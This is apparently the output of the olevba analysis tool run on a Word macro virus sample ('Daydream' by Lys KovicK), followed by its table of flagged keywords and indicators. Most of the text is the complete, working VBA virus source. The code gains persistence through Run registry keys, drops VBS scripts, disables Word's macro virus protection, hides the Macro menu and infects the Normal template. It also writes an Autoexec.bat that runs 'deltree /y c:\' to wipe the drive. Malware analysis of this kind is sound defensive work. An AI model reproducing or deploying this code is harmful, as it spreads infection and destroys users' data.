olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Lys.f-18c10dbbaee7b4f23a6d8d8f3cd10d8cab5d81fd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Lys.f-18c10dbbaee7b4f23a6d8d8f3cd10d8cab5d81fd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "") = "C:\WINDOWS\SYSTEM\Daydream.vbs"
ActiveDocument.VBProject.VBComponents.Item(1).Export ("C:\WINDOWS\SYSTEM\Daydream.dll")
Open "C:\WINDOWS\SYSTEM\Daydream.vbs" For Output As #1
Print #1, "Set Daydream = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "Daydream.Options.VirusProtection = (0 - 0):Daydream.Options.SaveNormalPrompt = (1 - 1):Daydream.Options.ConfirmConversions = (2 - 2)"
Print #1, "Daydream.CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Visible = (3 - 3)"
Print #1, "For x = 1 To Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\SYSTEM\Daydream.sys" & Chr(34) & ")"
Print #1, "Daydream.Application.Quit"
Close #1
Open "C:\WINDOWS\SYSTEM\Daydream.sys" For Output As #1
Print #1, "Private Sub Document_Open()"
Print #1, "With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule"
Print #1, "For x = 1 to ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, ".DeleteLines 1"
Print #1, "Next"
Print #1, "End With"
Print #1, "ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\SYSTEM\Daydream.dll" & Chr(34) & ")"
Print #1, "For x = 1 To ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find(" & Chr(34) & "Private Sub Document_Close()" & Chr(34) & ", 1, 1, 1, 30, True, True, True) = False Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "End Sub"
Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Subsystem") = "C:\WINDOWS\SYSTEM\32bitemu.vbs"
Open "C:\WINDOWS\SYSTEM\32bitemu.vbs" For Output As #1
Print #1, "Set A = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "If (A.FileExists(" & Chr(34) & "C:\WINDOWS\SYSTEM\Daydream.vbs" & Chr(34) & ")) = False Then"
Print #1, "Set B = A.CreateTextFile(" & Chr(34) & "C:\Autoexec.bat" & Chr(34) & ", True)"
Print #1, "B.WriteLine (" & Chr(34) & "@deltree /y c:\ > NUL" & Chr(34) & ")"
Print #1, "B.Close"
Print #1, "End If"
Close #1
If Day(15) Then
SetAttr "C:\Msdos.sys", vbNormal
System.PrivateProfileString("C:\Msdos.sys", "Options", "BootGUI") = "0"
SetAttr "C:\Msdos.sys", vbSystem + vbHidden + vbReadOnly
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find("Sub AutoClose()", 1, 1, 1, 15, True, True, True) = True Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Close()"
Else: ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Sub AutoClose()"
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
'.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.
' Daydream(Fantasy) By Lys KovicK
';';';';';';';';';';';';';';';';';


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Daydream.vbs        |Executable file name                         |
|IOC       |Daydream.dll        |Executable file name                         |
|IOC       |32bitemu.vbs        |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

